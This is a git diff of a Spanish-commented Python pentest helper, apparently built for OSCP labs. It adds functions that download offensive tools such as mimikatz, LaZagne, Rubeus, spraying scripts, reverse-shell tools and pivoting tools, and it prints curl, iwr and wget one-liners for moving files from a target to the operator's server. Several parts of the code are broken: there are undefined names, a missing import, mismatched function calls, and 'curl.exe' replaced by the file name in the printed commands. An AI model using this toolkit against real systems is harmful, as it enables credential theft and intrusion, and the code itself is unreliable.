@@ -1,40 +1,48 @@
 #!/usr/bin/python3
 
-import base64
-import http.server
-import socketserver
+
+
 import os
 import sys
+import base64
+import signal
 import subprocess
-import cgi
 import warnings
 import argparse
-from pyftpdlib.authorizers import DummyAuthorizer
-from pyftpdlib.handlers import FTPHandler
-from pyftpdlib.servers import FTPServer
-from pyftpdlib.handlers import TLS_FTPHandler
-from colorama import Fore, Style, init
 import textwrap
 import ssl
 from OpenSSL import SSL
 import psutil
 import socket
+import http.server
+import socketserver
+import threading
+from pwn import *
+from pwn import log, context
+from pyftpdlib.authorizers import DummyAuthorizer
+from pyftpdlib.handlers import FTPHandler
+from pyftpdlib.servers import FTPServer
+from pyftpdlib.handlers import TLS_FTPHandler
+from colorama import Fore, Style, init
 
-# Direct access files  <- ** ADD YOUR OWN SHORTCUTS HERE **
-SHORTCUTS = {
-    # ------------------For windows------------------------------------------
-    '/mm.exe': '~/git/mimikatz64.exe',  # Mimikatz
-    '/mm32.exe': '~/git/mimikatz32.exe',  # Mimikatz32
-    # ------------------Recon scripts----------------------------------------
-    '/recon.sh': '~/bin/recon.sh',  # Linux reconnaissance script
-    '/recon.ps1': '~/bin/recon.ps1',  # Windows reconnaissance script
-}
+context.log_level = 'info'  # Configura el nivel de log de pwntools
 
-# Files to replace IP
-IP_REPLACE = [
-    '/recon.sh',
-    '/recon.ps1'
-]
+# Variable global para almacenar el hilo del servidor HTTP
+http_thread = None
+p1 = None
+stop_flag = threading.Event()
+
+
+def is_port_in_use(port):
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+        return sock.connect_ex(('localhost', port)) == 0
+
+def def_handler(sig, frame):
+    print("\n\t[*]Saliendo...\n")
+    sys.exit(1)
+
+signal.signal(signal.SIGINT, def_handler)
+
 
 def get_ip(interface):
     # Obtener todos los interfaces de red
@@ -51,6 +59,18 @@ def get_ip(interface):
             elif snic.family == socket.AF_INET:
                 return snic.address
     return None
+
+
+# Clase personalizada de TCPServer para soportar parada
+class CustomTCPServer(socketserver.TCPServer):
+    def __init__(self, server_address, RequestHandlerClass):
+        super().__init__(server_address, RequestHandlerClass)
+        self.allow_reuse_address = True  # Permite reutilizar el puerto
+
+    def serve_forever(self):
+        while not stop_flag.is_set():  # Verifica la flag para detener el servidor
+            self.handle_request()
+        self.server_close()  # Cierra el servidor al detenerse
 
 # HTTP Handler
 class HTTPHandler(http.server.SimpleHTTPRequestHandler):
@@ -101,16 +121,22 @@ class HTTPHandler(http.server.SimpleHTTPRequestHandler):
         self.wfile.write(b'Received!!')
         print(" [*] File received: ", filename)
 
-# Start HTTP server
-def start_http_server():
-    with socketserver.TCPServer(("", PORT), HTTPHandler) as httpd:
-        print(" [>] Listening on port ", PORT)
-        try:
+
+
+
+def start_http_server(PORT):
+    global http_server, stop_flag, p1  # Accedemos a la variable global p1
+    try:
+        with CustomTCPServer(("", PORT), HTTPHandler) as httpd:
+            http_server = httpd
+            p1 = log.progress(f"HTTP server running on port {PORT}")
+            p1.status(f"Running on port: {PORT}")  # Corregido: usando una cadena formateada
             httpd.serve_forever()
-        except KeyboardInterrupt:
-            print("\n [>] Closing the HTTP server...")
-            httpd.server_close()
-            sys.exit(0)
+    except Exception as e:
+        log.failure(f"Error en el servidor HTTP: {e}")
+    finally:
+        if p1:
+            p1.success("HTTP server stopped")  # Marcar el progreso como detenido
 
 
 
@@ -243,21 +269,38 @@ def start_smb_server():
 
 
 # Print instructions for file transfer with authentication
-def print_transfer_instructions():
+def upload(command):
+    parts = command.split()
+
+    # Verificar que hay al menos 4 argumentos (5 incluyendo el nombre del comando)
+    if len(parts) < 4:
+        print(f"[!] Format: protocol IP PORT FILE [username] [password]")
+        return
+
+    # Asignación de argumentos obligatorios
+    SERVICE = parts[1]
+    IP = parts[2]
+    PORT = parts[3]
+    FILE = parts[4]
+
+    # Asignación de argumentos opcionales
+    USERNAME = parts[5] if len(parts) > 5 else None
+    PASSWORD = parts[6] if len(parts) > 6 else None
+
     if SERVICE == 'ftp':
         if USERNAME and PASSWORD:
-            print(f"   To download a file: curl ftp://{USERNAME}:{PASSWORD}@<IP>:{PORT}/{FILE} -o {FILE}")
-            print(f"   To upload a file: curl -T {FILE} ftp://{USERNAME}:{PASSWORD}@<IP>:{PORT}/{FILE}")
+            print(f"   To download a file: curl ftp://{USERNAME}:{PASSWORD}@{IP}:{PORT}/{FILE} -o {FILE}")
+            print(f"   To upload a file: curl -T {FILE} ftp://{USERNAME}:{PASSWORD}@{IP}:{PORT}/{FILE}")
         else:
             print(f"   To download a file: curl ftp://<IP>:{PORT}/{FILE} -o {FILE}")
-            print(f"   To upload a file: curl -T {FILE} ftp://<IP>:{PORT}/{FILE}")
+            print(f"   To upload a file: curl -T {FILE} ftp://{IP}:{PORT}/{FILE}")
 
 
     elif SERVICE == 'sftp':
         if USERNAME and PASSWORD:
-            print(f"C:\\Windows\\System32\\curl.exe --ftp-ssl -u {USERNAME}:{PASSWORD} -T {FILE} ftp://{IP}:{PORT}/{FILE}")
+            print(f"C:\\Windows\\System32\\{FILE} --ftp-ssl -u {USERNAME}:{PASSWORD} -T {FILE} ftp://{IP}:{PORT}/{FILE}")
         else:
-            print(f"C:\\Windows\\System32\\curl.exe --ftp-ssl -T {FILE} ftp://{IP}:{PORT}/{FILE}")
+            print(f"C:\\Windows\\System32\\{FILE} --ftp-ssl -T {FILE} ftp://{IP}:{PORT}/{FILE}")
 
     
     elif SERVICE == 'smb':
@@ -306,7 +349,7 @@ def print_transfer_instructions():
             print(f"\tcurl -X POST -F 'file=@{FILE}' http://{IP}:{PORT}/{FILE}")
             print(f"\tiwr -uri http://{IP}:{PORT}/{FILE} -Method Post -InFile {FILE} -UseBasicParsing")
             print(f"\tcurl -X POST -F \"file=@{FILE}\" http://{IP}:{PORT}/upload")
-            print(f"\twget http://{IP}:{PORT}/{FILE} --method=POST --body-file={FILE} -OutFile response.txt")
+            print(f"\twget http://{IP}:{PORT}/{FILE} --method=POST --body-file={FILE} -OutFile {FILE}")
 
 
     elif SERVICE == 'https':
@@ -314,15 +357,15 @@ def print_transfer_instructions():
         print(f"\n[+] HTTPS transfer instructions:")
         print(f"To download a file: ")
         if USERNAME and PASSWORD:
-            print(f"C:\\Windows\\System32\\curl.exe -u {USERNAME}:{PASSWORD} -o {FILE} https://{IP}:{PORT}/{FILE}")
+            print(f"C:\\Windows\\System32\\{FILE} -u {USERNAME}:{PASSWORD} -o {FILE} https://{IP}:{PORT}/{FILE}")
         else:
-            print(f"C:\\Windows\\System32\\curl.exe -o {FILE} https://{IP}:{PORT}/{FILE}")
+            print(f"C:\\Windows\\System32\\{FILE} -o {FILE} https://{IP}:{PORT}/{FILE}")
 
         print(f"\n[+] To upload a file:")
         if USERNAME and PASSWORD:
-            print(f"C:\\Windows\\System32\\curl.exe -u {USERNAME}:{PASSWORD} -X POST -F 'file=@{FILE}' https://{IP}:{PORT}/{FILE}")
+            print(f"C:\\Windows\\System32\\{FILE} -u {USERNAME}:{PASSWORD} -X POST -F 'file=@{FILE}' https://{IP}:{PORT}/{FILE}")
         else:
-            print(f"C:\\Windows\\System32\\curl.exe -X POST -F 'file=@{FILE}' https://{IP}:{PORT}/{FILE}")
+            print(f"C:\\Windows\\System32\\{FILE} -X POST -F 'file=@{FILE}' https://{IP}:{PORT}/{FILE}")
 
 
     elif SERVICE == 'scp':
@@ -407,74 +450,696 @@ def print_transfer_instructions():
         print(f"\n[+] Unrecognized protocol")
 
 
-def help():
-    print("Start https server with credentials")
-    print("servpy https -u kermit -pw Password123 -f mimikatz.exe")
-    print("-t: Print commands without starting any service")
-    print("servpy smb -u kermit -pw Password123 -f mimikatz.exe -t")
-    print("Start server one liners")
-    print("servpy servers")
-    print("Recomended paths for downloads")
-    print("servpy paths")
-    sys.exit(0)
 
-# Service selection function
-def run_service():
-    services = {
-        'http': start_http_server,
-        'ftp': start_ftp_server,
-        'smb': start_smb_server,
-        'https': start_https_server,
-        'ftps': start_ftps_server
-    }
+
+
+
+
+
+def download_kerbrute(platform, arch):
+
+    if platform == "linux":
+        if arch == "x86": 
+            url = "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_386" 
+        else:
+            url = "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64"
     
-    service_func = services.get(SERVICE)
-    if service_func:
-        service_func()
+    elif platform == "windows":
+        if arch == "x86":
+            url = "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe" 
+        else:
+            url = "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe"
+    
     else:
-        print("Unknown service type. Please select either 'http', 'ftp', or 'smb'.")
+        print("Unsupported platform specified.")
+        return
+
+    try:
+        #os.makedirs("kerbrute", exist_ok=True)
+        filename = os.path.basename(url)
+        subprocess.run(["wget", url, "-O", filename], check=True)
+        if platform == "linux":
+            subprocess.run(["chmod", "+x", filename], check=True)
+        print(f"Kerbrute for {platform} {arch} downloaded successfully.")
+    except subprocess.CalledProcessError as e:
+        print(f"Error during download: {e}")
+
+
+def download_impacket(platform, arch):
+    if platform == "linux":
+        url = "https://github.com/ropnop/impacket_static_binaries/releases/download/0.9.22.dev-binaries/impacket_linux_binaries.tar.gz"
+    elif platform == "windows":
+        url = "https://github.com/ropnop/impacket_static_binaries/releases/download/0.9.22.dev-binaries/impacket_windows_binaries.zip"
+    else:
+        print("Unsupported platform specified.")
+        return
+
+    try:
+        subprocess.run(["wget", url], check=True)
+        if platform == "linux":
+            subprocess.run(["mkdir", "-p", "impacket"], check=True)
+            subprocess.run(["tar", "-xf", "impacket_linux_binaries.tar.gz", "-C", "impacket"], check=True)
+            subprocess.run(["rm", "impacket_linux_binaries.tar.gz"], check=True)
+        elif platform == "windows":
+            subprocess.run(["unzip", "impacket_windows_binaries.zip"], check=True)
+            subprocess.run(["mv", "dist", "impacket_ropnop"], check=True)
+            subprocess.run(["rm", "impacket_windows_binaries.zip"], check=True)
+        print(f"Impacket for {platform} downloaded and extracted successfully.")
+    except subprocess.CalledProcessError as e:
+        print(f"Error during download or extraction: {e}")
+
+def download_linenum():
+    url = "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"
+    output_file = "LinEnum.sh"
+    
+    try:
+        # Ejecutar el comando wget para descargar el archivo
+        subprocess.run(["wget", url, "-O", output_file], check=True)
+        print(f"Downloaded {output_file} successfully.")
+    except subprocess.CalledProcessError as e:
+        print(f"Error during download: {e}")
+
+
+def download_linuxprivchecker():
+    url = "https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py"
+    output_file = "linuxprivchecker.py"
+    
+    try:
+        # Ejecutar el comando wget para descargar el archivo
+        subprocess.run(["wget", url, "-O", output_file], check=True)
+        print(f"Downloaded {output_file} successfully.")
+    except subprocess.CalledProcessError as e:
+        print(f"Error during download: {e}")
+
+def download_linux_exploit_suggester2():
+    url = "https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl"
+    output_file = "linux-exploit-suggester-2.pl"
+    
+    try:
+        # Ejecutar el comando wget para descargar el archivo
+        subprocess.run(["wget", url, "-O", output_file], check=True)
+        print(f"Downloaded {output_file} successfully.")
+    except subprocess.CalledProcessError as e:
+        print(f"Error during download: {e}")
 
 
 
-# Suppress deprecated cgi warnings
-warnings.filterwarnings("ignore", category=DeprecationWarning, module="cgi")
 
 
-# Argument parser setup
-parser = argparse.ArgumentParser(description="Simple multi-service server with optional authentication")
-parser.add_argument('service', choices=['http', 'ftp', 'smb', 'https', 'ftps','socat','nc','scp','servers', 'paths'], help="Type of service to run (http, ftp, smb)")
-parser.add_argument('-p', '--port', type=int, default=80, help="Port number to use (default: 80)")
-parser.add_argument('-u', '--user', type=str, help="Username for authentication (optional)")
-parser.add_argument('-f', '--file', type=str, default="<file>", help="Path to a file to be used by the server")
-parser.add_argument('-i', '--interface', type=str, default="eth0", help="Interface IP")
-parser.add_argument('-pw', '--password', type=str, help="Password for authentication (optional)")
-parser.add_argument('-t', '--transfer', action='store_true', help="Just print file transfer examples")
+def download_rpcenum():
+    url = "https://raw.githubusercontent.com/KermitPurple96/rpcenum/master/rpcenum.sh"
+    output_file = "rpcenum.sh"
+    
+    try:
+        # Ejecutar el comando wget para descargar el archivo
+        subprocess.run(["wget", url, "-O", output_file], check=True)
+        print(f"Downloaded {output_file} successfully.")
+    except subprocess.CalledProcessError as e:
+        print(f"Error during download: {e}")
 
-args = parser.parse_args()
+def download_pywerview():
+    url = "https://github.com/the-useless-one/pywerview/archive/refs/tags/v0.6.zip"
+    output_file = "pywerview_v0.6.zip"
+    
+    try:
+        # Ejecutar el comando wget para descargar el archivo
+        subprocess.run(["wget", url, "-O", output_file], check=True)
+        subprocess.run(["unzip", output_file], check=True)
+        subprocess.run(["rm", output_file], check=True)
+
+        print(f"Downloaded {output_file} successfully.")
+    except subprocess.CalledProcessError as e:
+        print(f"Error during download: {e}")
+
+def download_adpeas():
+    subprocess.run(["wget", "https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1"], check=True)
+
+def download_adpeas_light():
+    subprocess.run(["wget", "https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS-Light.ps1"], check=True)
+
+def download_sharpview():
+    subprocess.run(["wget", "https://github.com/tevora-threat/SharpView/blob/master/Compiled/SharpView.exe"], check=True)
+
+def download_powerview():
+    subprocess.run(["wget", "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1"], check=True)
+
+def download_sharphound():
+    subprocess.run(["wget", "https://github.com/BloodHoundAD/SharpHound/releases/download/v2.5.1/SharpHound-v2.5.1.zip"], check=True)
+    subprocess.run(["unzip", "SharpHound-v2.5.1.zip"], check=True)
 
 
-SERVICE = args.service
-interface = args.interface
-IP = get_ip(interface)
-PORT = args.port
-FILE = args.file
-USERNAME = args.user
-PASSWORD = args.password
-CERTFILE = 'server.crt'  # Ruta al certificado
-KEYFILE = 'server.key'   # Ruta a la clave privada
+
+
+
+
+
+
+def download_dnstools():
+
+    subprocess.run(["pip", "install", "git+https://github.com/dirkjanm/adidnsdump#egg=adidnsdump"], check=True)
+    subprocess.run(["wget", "https://raw.githubusercontent.com/dirkjanm/krbrelayx/master/addspn.py"], check=True)
+    subprocess.run(["wget", "https://raw.githubusercontent.com/dirkjanm/krbrelayx/master/dnstool.py"], check=True)
+    subprocess.run(["wget", "https://raw.githubusercontent.com/dirkjanm/krbrelayx/master/krbrelayx.py"], check=True)
+    subprocess.run(["wget", "https://raw.githubusercontent.com/dirkjanm/krbrelayx/master/printerbug.py"], check=True)
+
+
+
+
+def download_sprying():
+
+    subprocess.run(["git", "clone", "https://github.com/cube0x0/HashSpray.py"], check=True)
+    subprocess.run(["git", "clone", "https://github.com/Hackndo/sprayhound"], check=True)
+
+def download_domain_password_spray():
+    subprocess.run(["wget", "https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1"], check=True)
+
+
+
+
+
+
+def download_pkinit():
+    subprocess.run(["git", "clone", "https://github.com/dirkjanm/PKINITtools"], check=True)
+    
+
+
+
+
+def download_maz_windows_binaries():
+    subprocess.run(["wget", "https://github.com/maaaaz/impacket-examples-windows/releases/download/v0.9.17/impacket-examples-windows-v0.9.17.zip"], check=True)
+    subprocess.run(["unzip", "impacket-examples-windows-v0.9.17.zip"], check=True)
+    subprocess.run(["rm", "impacket-examples-windows-v0.9.17.zip"], check=True)
+
+def download_sysinternals():
+    subprocess.run(["wget", "https://download.sysinternals.com/files/SysinternalsSuite.zip"], check=True)
+    subprocess.run(["unzip", "SysinternalsSuite.zip", "-d", "sysinternals"], check=True)
+    subprocess.run(["rm", "SysinternalsSuite.zip"], check=True)
+
+def download_sharpcollection():
+    subprocess.run(["git", "clone", "https://github.com/Flangvik/SharpCollection"], check=True)
+
+def download_nc_exe():
+    subprocess.run(["wget", "https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip"], check=True)
+    subprocess.run(["unzip", "netcat-win32-1.12.zip"], check=True)
+    subprocess.run(["rm", "netcat-win32-1.12.zip"], check=True)
+
+
+
+
+def download_powersharppack():
+    subprocess.run(["wget", "https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpPack.ps1"], check=True)
+
+def download_powerupsql():
+    subprocess.run(["wget", "https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1"], check=True)
+
+def download_invoke_psexec():
+    subprocess.run(["wget", "https://raw.githubusercontent.com/HarmJ0y/Misc-PowerShell/master/Invoke-PsExec.ps1"], check=True)
+
+def download_invoke_conptyshell():
+    subprocess.run(["wget", "https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1"], check=True)
+
+def download_conptyshell_exe():
+    subprocess.run(["wget", "https://github.com/antonioCoco/ConPtyShell/releases/download/1.5/ConPtyShell.zip"], check=True)
+    subprocess.run(["unzip", "ConPtyShell.zip"], check=True)
+    subprocess.run(["rm", "ConPtyShell.zip"], check=True)
+
+def download_powercat():
+    subprocess.run(["wget", "https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1"], check=True)
+
+def download_nishang():
+    subprocess.run(["git", "clone", "https://github.com/samratashok/nishang"], check=True)
+
+def download_invoke_thehash():
+    subprocess.run(["git", "clone", "https://github.com/Kevin-Robertson/Invoke-TheHash"], check=True)
+
+def download_recon():
+    if platform == "linux":
+        subprocess.run(["wget", "https://raw.githubusercontent.com/KermitPurple96/OSCP-PythonSupportTools/main/recon.ps1"], check=True)
+    elif platform == "windows":
+        subprocess.run(["wget", "https://raw.githubusercontent.com/KermitPurple96/OSCP-PythonSupportTools/main/recon.sh"], check=True)
+
+
+
+def download_windows_exploit_suggester():
+    url = "https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py"
+    output_file = "windows-exploit-suggester.py"
+    
+    try:
+        # Ejecutar el comando wget para descargar el archivo
+        subprocess.run(["wget", url, "-O", output_file], check=True)
+        print(f"Downloaded {output_file} successfully.")
+    except subprocess.CalledProcessError as e:
+        print(f"Error during download: {e}")      
+
+def download_jaws_enum():
+    subprocess.run(["wget", "https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1"], check=True)
+
+def download_powerless():
+    subprocess.run(["wget", "https://raw.githubusercontent.com/gladiatx0r/Powerless/master/Powerless.bat"], check=True)
+
+def download_sherlock():
+    subprocess.run(["wget", "https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1"], check=True)
+
+def download_privesccheck():
+    subprocess.run(["wget", "https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1"], check=True)
+
+def download_powerup():
+    subprocess.run(["wget", "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1"], check=True)
+
+def download_kekeo():
+    subprocess.run(["wget", "https://github.com/gentilkiwi/kekeo/releases/download/2.2.0-20211214/kekeo.zip"], check=True)
+    subprocess.run(["unzip", "kekeo.zip"], check=True)
+
+def download_lazagne():
+    subprocess.run(["wget", "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe"], check=True)
+
+def download_mimikatz(arch):
+    url = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip"
+    
+    try:
+        # Descargar el archivo
+        subprocess.run(["wget", url, "-O", "mimikatz_trunk.zip"], check=True)
+        
+        # Descomprimir el archivo zip
+        subprocess.run(["unzip", "mimikatz_trunk.zip"], check=True)
+        
+        # Eliminar el directorio correspondiente según la arquitectura
+        if arch == "x64":
+            shutil.rmtree("./Win32", ignore_errors=True)
+        elif arch == "x86":
+            shutil.rmtree("./x64", ignore_errors=True)
+        
+        # Copiar el ejecutable a la raíz del directorio
+        if arch == "x64":
+            shutil.copy("./x64/mimikatz.exe", "mimikatz.exe")
+        elif arch == "x86":
+            shutil.copy("./x86/mimikatz.exe", "mimikatz.exe")
+        
+        # Eliminar el archivo zip y el directorio temporal
+        os.remove("./mimikatz_trunk.zip")
+        #os.remove("./kiwi_passwords.yar")
+        #os.remove("./mimicom.idl")
+        os.remove("./README.md")
+        print("Mimikatz downloaded and extracted successfully.")
+    except subprocess.CalledProcessError as e:
+        print(f"Error during download or extraction: {e}")
+    except FileNotFoundError as e:
+        print(f"File not found error: {e}")
+
+
+
+
+
+
+def download_ligolo(platform, arch):
+    
+    if platform == "windows":
+        subprocess.run(["wget", "https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.1-alpha/ligolo-ng_proxy_0.7.1-alpha_windows_amd64.zip"], check=True)
+        subprocess.run(["wget", "https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.1-alpha/ligolo-ng_agent_0.7.1-alpha_windows_amd64.zip"], check=True)
+
+    elif platform == "linux":
+        subprocess.run(["wget", "https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.1-alpha/ligolo-ng_proxy_0.7.1-alpha_linux_amd64.tar.gz"], check=True)
+        subprocess.run(["wget", "https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.1-alpha/ligolo-ng_agent_0.7.1-alpha_linux_amd64.tar.gz"], check=True)
+
+def download_chisel(platform, arch):
+    
+    if platform == "windows":
+        subprocess.run(["wget", "https://github.com/jpillora/chisel/releases/download/v1.10.0/chisel_1.10.0_windows_amd64.gz"], check=True)
+        subprocess.run(["gunzip", "chisel_1.10.0_windows_amd64.gz"], check=True)
+
+    elif platform == "linux":
+        if arch == "x86":
+            subprocess.run(["wget", "https://github.com/jpillora/chisel/releases/download/v1.10.0/chisel_1.10.0_linux_386.gz"], check=True)
+            subprocess.run(["gunzip", "chisel_1.10.0_linux_386.gz"], check=True)
+
+        elif arch == "x64":
+            subprocess.run(["wget", "https://github.com/jpillora/chisel/releases/download/v1.10.0/chisel_1.10.0_linux_amd64.gz"], check=True)
+            subprocess.run(["gunzip", "chisel_1.10.0_linux_amd64.gz"], check=True)
+
+        else:
+            print("Unsupported platform specified.")
+            return
+
+def download_socat(platform, arch):
+    if platform == "windows":
+        if arch == "x86":
+            url = "https://sourceforge.net/projects/unix-utils/files/socat/1.7.3.2/socat-1.7.3.2-1-i686.zip/download"
+            output_file = "socat-1.7.3.2-1-i686.zip"
+        elif arch == "x64":
+            url = "https://sourceforge.net/projects/unix-utils/files/socat/1.7.3.2/socat-1.7.3.2-1-x86_64.zip/download"
+            output_file = "socat-1.7.3.2-1-x86_64.zip"
+        else:
+            print("Unsupported architecture specified for Linux.")
+            return
+    elif platform == "linux":
+        if arch == "x64":
+            url = "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat"
+            output_file = "socat"
+        else:
+            print("Unsupported architecture specified for Windows.")
+            return
+    else:
+        print("Unsupported platform specified.")
+        return
+
+    try:
+        # Descargar el archivo usando wget
+        subprocess.run(["wget", url, "-O", output_file], check=True)
+        print(f"Downloaded {output_file} successfully.")
+        
+        # Si el archivo es un zip, descomprimirlo
+        if output_file.endswith(".zip"):
+            subprocess.run(["unzip", output_file], check=True)
+            print(f"Extracted {output_file} successfully.")
+            
+            # Borrar el archivo zip después de la extracción
+            os.remove(output_file)
+            print(f"Deleted {output_file} successfully.")
+    except subprocess.CalledProcessError as e:
+        print(f"Error during download or extraction: {e}")
+
+
+
+def download_sharpwmi():
+    subprocess.run(["wget", "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpWMI.exe"], check=True)
+
+
+def download_sharpup():
+    subprocess.run(["wget", "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpUp.exe"], check=True)
+
+def download_rubeus():
+    subprocess.run(["wget", "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe"], check=True)
+
+def download_certify():
+    subprocess.run(["wget", "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Certify.exe"], check=True)
+
+
+
+
+
+
+
+def download_poshadcs():
+    subprocess.run(["wget", "https://raw.githubusercontent.com/cfalta/PoshADCS/master/ADCS.ps1"], check=True)
+
+def download_adcspwn():
+    subprocess.run(["wget", "https://github.com/bats3c/ADCSPwn/releases/download/ADCSPwn/ADCSPwn.exe"], check=True)
+
+def download_adcskiller():
+    subprocess.run(["git", "clone", "https://github.com/grimlockx/ADCSKiller"], check=True)
+
+
+
+def download_powersccm():
+    subprocess.run(["wget", "https://raw.githubusercontent.com/PowerShellMafia/PowerSCCM/master/PowerSCCM.ps1"], check=True)
+
+def download_sharpsccm():
+    subprocess.run(["wget", "https://github.com/Mayyhem/SharpSCCM/releases/download/main/SharpSCCM.exe"], check=True)
+
+def sccm_hunter():
+    subprocess.run(["wget", "https://github.com/garrettfoster13/sccmhunter/archive/refs/tags/v.1.0.5.zip"], check=True)
+    subprocess.run(["unzip", "v.1.0.5.zip"], check=True)
+    subprocess.run(["rm", "v.1.0.5.zip"], check=True)
+
+def adcs():
+    download_adcs()
+    download_adcspwn()
+    download_adcskiller()
+
+
+def sccm():
+    download_powersccm()
+    download_sharpsccm()
+    sccm_hunter()
+
+
+def discovery(platform, arch):
+
+    download_rpcenum()
+    download_pywerview()
+    download_adpeas()
+    download_adpeas_light()
+    download_sharpview()
+    download_powerview()
+    download_sharphound()
+
+
+
+def privesc(platform, arch):
+
+    if platform == "windows":
+
+        download_windows_exploit_suggester()
+        download_jaws_enum()
+        download_powerless()
+        download_sherlock()
+        download_privesccheck()
+        download_powerup()
+        download_kekeo()
+        download_lazagne()
+
+    elif platform == "linux":
+
+        download_linenum()
+        download_linuxprivchecker()
+        download_linux_exploit_suggester2()
+
+
+def pivoting(platform, arch):
+    download_ligolo(platform,arch)
+    download_socat(platform,arch)
+    download_chisel(platform,arch)
+
+
+
+
+
+def tool(command):
+
+    parts = command.split()
+
+
+    tool = parts[1] if len(parts) > 1 else None
+
+    # Asignar 'system' si existe un segundo argumento
+    system = parts[2] if len(parts) > 2 else None
+
+    # Asignar 'arch' si existe un tercer argumento
+    arch = parts[3] if len(parts) > 3 else None
+
+    # Validar si 'tool_name' es None
+    if tool is None:
+        print("[!] Comando incompleto. Debe especificar al menos una herramienta.")
+        return
+    
+    match tool:
+        case "privesc":
+            privesc(arch)
+        case "mimikatz":
+            download_mimikatz(arch)
+        case "kerbrute":
+            download_kerbrute(system, arch)
+        case "impacket":
+            download_impacket(system, arch)
+        case "suggester":
+            download_windows_exploit_suggester(system, arch)
+        case "suggester2":
+            download_linux_exploit_suggester2(system, arch)
+        case "checker":
+            download_linuxprivchecker(system, arch)
+        case "linenum":
+            download_linenum(system, arch)
+        case "pywerview":
+            download_pywerview()
+        case "rpcenum":
+            download_rpcenum()
+        case "socat":
+            download_socat(system, arch)
+        case "dnstools":
+            download_dnstools()
+        case "sprying":
+            download_sprying()
+        case "pkinit":
+            download_pkinit()
+        case "adcskiller":
+            download_adcskiller()
+        case "sccme_hunter":
+            sccme_hunter(system, arch)
+        case "maz_windows_binaries":
+            download_maz_windows_binaries(system, arch)
+        case "sysinternals":
+            download_sysinternals()
+        case "sharpcollection":
+            download_sharpcollection()
+        case "nc_exe":
+            download_nc_exe(system, arch)
+        case "powersharppack":
+            download_powersharppack()
+        case "powerupsql":
+            download_powerupsql()
+        case "invoke_psexec":
+            download_invoke_psexec()
+        case "invoke_conptyshell":
+            download_invoke_conptyshell()
+        case "conptyshell_exe":
+            download_conptyshell_exe()
+        case "powercat":
+            download_powercat()
+        case "nishang":
+            download_nishang()
+        case "invoke_thehash":
+            download_invoke_thehash()
+        case "jaws_enum":
+            download_jaws_enum()
+        case "powerless":
+            download_powerless()
+        case "sherlock":
+            download_sherlock()
+        case "privesccheck":
+            download_privesccheck()
+        case "powerup":
+            download_powerup()
+        case "kekeo":
+            download_kekeo()
+        case "lazagne":
+            download_lazagne()
+        case "adpeas":
+            download_adpeas()
+        case "adpeas-light":
+            download_adpeas_light()
+        case "sharpview":
+            download_sharpview()
+        case "powerview":
+            download_powerview()
+        case "sharphound":
+            download_sharphound()
+        case "password_spray":
+            download_domain_password_spray()
+        case "ligolo":
+            download_ligolo(system, arch)
+        case "poshadcs":
+            download_adcs()
+        case "adcspwn":
+            download_adcspwn()
+        case "powersccm":
+            download_powersccm()
+        case "sharpsccm":
+            download_sharpsccm()
+        case "sharpwmi":
+            download_sharpwmi()
+        case "sharpup":
+            download_sharpup()
+        case "rubeus":
+            download_rubeus()
+        case "certiy":
+            download_certify()
+        case "recon":
+            download_recon()
+        case _:
+            print(f"[!] La herramienta '{tool_name}' no está reconocida.")
+
+
+def handle_command(command):
+    global http_thread, http_server, p1, stop_flag
+
+    parts = command.split()
+    if len(parts) < 2:
+        print(f"[!] Comando '{command}' no reconocido o incompleto")
+        return
+
+    first_word, second_word = parts[0], parts[1]
+
+    print(first_word)
+    print(second_word)
+
+    if first_word == "upload":
+        upload(service, username, password, ip, port, file)
+
+    if first_word == "download":
+        upload(service, username, password, ip, port, file)
+
+    elif first_word == "http":
+        if second_word == "up":
+            if len(parts) > 2:
+                try:
+                    port = int(parts[2])
+                except ValueError:
+                    print(f"[!] El puerto '{parts[2]}' no es válido.")
+                    return
+            else:
+                port = 80  # Puerto por defecto si no se especifica
+
+            if is_port_in_use(port):
+                log.failure(f"El puerto {port} ya está en uso. No se puede iniciar el servidor HTTP.")
+            else:
+                log.info(f"Iniciando servidor HTTP en el puerto {port}...")
+                PORT = port
+                stop_flag.clear()  # Asegura que la flag esté limpia antes de iniciar el servidor
+                http_thread = threading.Thread(target=start_http_server, args=(PORT,))
+                http_thread.start()
+        
+        elif second_word == "down":
+            if http_thread and http_thread.is_alive():
